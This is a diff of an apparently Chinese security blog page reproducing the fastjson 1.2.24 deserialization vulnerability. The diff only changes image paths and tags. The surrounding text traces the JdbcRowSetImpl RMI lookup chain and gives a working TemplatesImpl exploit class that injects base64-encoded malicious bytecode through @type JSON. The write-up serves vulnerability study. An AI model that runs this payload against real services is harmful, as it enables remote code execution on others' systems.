@@ -308,26 +308,26 @@ var _hmt = _hmt || [];
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Connection <span class="title">connect</span><span class="params">()</span><span class="keyword">throws</span> SQLException</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn!=<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.getDataSourceName()!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            InitialContext var1=<span class="keyword">new</span> InitialContext();</span><br><span class="line">            <span class="comment">//调用了lookup方法获取数据库连接</span></span><br><span class="line">            DataSource var2=(DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName()); <span class="comment">//lookup函数，且DataSourceName可控</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername()!=<span class="keyword">null</span>&amp;&amp;!<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>)?var2.getConnection(<span class="keyword">this</span>.getUsername(),<span class="keyword">this</span>.getPassword()):var2.getConnection();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(NamingException var3)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getUrl()!=<span class="keyword">null</span>?DriverManager.getConnection(<span class="keyword">this</span>.getUrl(),<span class="keyword">this</span>.getUsername(),<span class="keyword">this</span>.getPassword()):<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>而在exp中，datasource被我们设置为了恶意的rmi，因此lookup方法会从rmi标识中获取RMI服务指定的恶意类Exp并加载，当lookup方法内部加载Exp类就会触发漏洞。</p>
 <h4 id="fastjson调用分析"><a href="#fastjson调用分析" class="headerlink" title="fastjson调用分析"></a>fastjson调用分析</h4><p>在<code>com.alibaba.fastjson.parser.DefaultJSONParse.parseObject()</code>的274行，<code>key</code>被分割为我们传入的第一个键，即<code>@type</code>，且对其进行了判断，如果为<code>@type</code>且key不是不允许的特殊值，则进入276行的<code>TypeUtils.loadClass</code>。</p>
-<p><img src="image-20211015095051.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015095051.png"></p>
 <p>在<code>TypeUtils.loadClass</code>返回类名，</p>
-<p><img src="image-20211015095615.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015095615.png"></p>
 <p>回到<code>DefaultJSONParse.parseObject</code>，进入ParserConfig</p>
-<p><img src="image-20211015095716.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015095716.png"></p>
 <p>进入<code>ParserConfig.getDeserializer</code>到279行<code>this.getDeserializer</code>进入288行并向下执行，对类进行判断看是否在不允许的名单中</p>
-<p><img src="image-20211015100526.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015100526.png"></p>
 <p>继续向下执行，在257行，获取了父类</p>
-<p><img src="image-20211015100841.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015100841.png"></p>
 <p>从ParserConfig出来后，回到DefaultJSONParser292行，但到了293行，进入<code>JavaBeanDeserializer.class</code>然后一直运行到593行，<code>boolean match = this.parseField(parser, key, object, type, fieldValues);</code></p>
 <p>进入parseField函数然后继续运行到798行，<code>((FieldDeserializer)fieldDeserializer).parseField(parser, object, objectType, fieldValues);</code></p>
 <p>进入<code>DefaultFieldDeserializer.class</code>的79行<code>this.setValue(object, value);</code></p>
 <p>最后进入<code>FieldDeserializer.class</code>89行，<strong>按强制步入</strong>进行了invoke，如前面我们所说的，<strong>利用setSourceName设置了SourceName</strong>，如下：</p>
-<p><img src="image-20211015103048.png"></p>
-<p><img src="image-20211015150423.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015103048.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015150423.png"></p>
 <p>继续走，会发现会再invoke一遍，此时设置了autocommit。</p>
-<p><img src="image-20211015103301.png"></p>
-<p><img src="image-20211015162656.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015103301.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015162656.png"></p>
 <p>继续运行即可成功执行命令</p>
-<h4 id="最后的堆栈如下："><a href="#最后的堆栈如下：" class="headerlink" title="最后的堆栈如下："></a>最后的堆栈如下：</h4><p><img src="image-20211015101225.png"></p>
+<h4 id="最后的堆栈如下："><a href="#最后的堆栈如下：" class="headerlink" title="最后的堆栈如下："></a>最后的堆栈如下：</h4><p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015101225.png"></p>
 <h3 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h3><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>exp.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">exp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span> </span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        String evilClassPath = <span class="string">&quot;D:\\WorkSpace\\java\\exp\\src\\Test.class&quot;</span>;</span><br><span class="line">        String evilCode = readClass(<span class="string">&quot;D:\\WorkSpace\\java\\exp\\src\\Test.class&quot;</span>); <span class="comment">//自己修改Test.class所在目录</span></span><br><span class="line">        String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String text1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        JSON.parseObject(text1, Object.class, config, <span class="keyword">new</span> Feature[]&#123;Feature.SupportNonPublicField&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Test.java</p>
@@ -345,9 +345,9 @@ var _hmt = _hmt || [];
 <p>重点在invoke之后：</p>
 <p>关于进入TemplatesImpl之后的调用情况，这篇文章讲的很清楚：</p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1274/#_5">https://paper.seebug.org/1274/#_5</a></p>
-<h4 id="最后堆栈如下："><a href="#最后堆栈如下：" class="headerlink" title="最后堆栈如下："></a>最后堆栈如下：</h4><p><img src="image-20211015144846.png"></p>
+<h4 id="最后堆栈如下："><a href="#最后堆栈如下：" class="headerlink" title="最后堆栈如下："></a>最后堆栈如下：</h4><p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015144846.png"></p>
 <h4 id="复现注意"><a href="#复现注意" class="headerlink" title="复现注意"></a>复现注意</h4><p>java sec code用springboot跑起来的话是被修复了的，原因在于parseObject函数缺少Feature值，而<strong>fastjson默认情况下是不会反序列化私有属性的，如果需要对私有属性进行反序列化，则需要在parseObject()函数添加一个属性Feature.SupportNonPublicField</strong>。</p>
-<p><img src="image-20211015114150.png"></p>
+<p><img src="/2021/10/14/fastjson1-2-24%E5%A4%8D%E7%8E%B0/image-20211015114150.png"></p>
 <p>到了invoke出调试底层jdk代码的时候需要<strong>用强制步入</strong>，不然就直接没了</p>
 <h3 id="BasicDataSource链"><a href="#BasicDataSource链" class="headerlink" title="BasicDataSource链"></a>BasicDataSource链</h3><p>我没有复现成功</p>
 <p>但可以看看这篇文章：</p>
@@ -544,7 +544,7 @@ gitalk.render('gitalk-container')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021-2022 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
+    		&copy; 2021-2024 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
     	</div>
       	<div class="footer-right">
 			
@@ -667,11 +667,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -687,23 +695,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color3">范围</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -727,6 +731,14 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -747,11 +759,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">yii</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -767,15 +787,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -783,7 +795,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">tips</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -791,11 +803,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">汇编语言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color5">绕过方法</a>
               </li>
              
               <li class="article-tag-list-item">
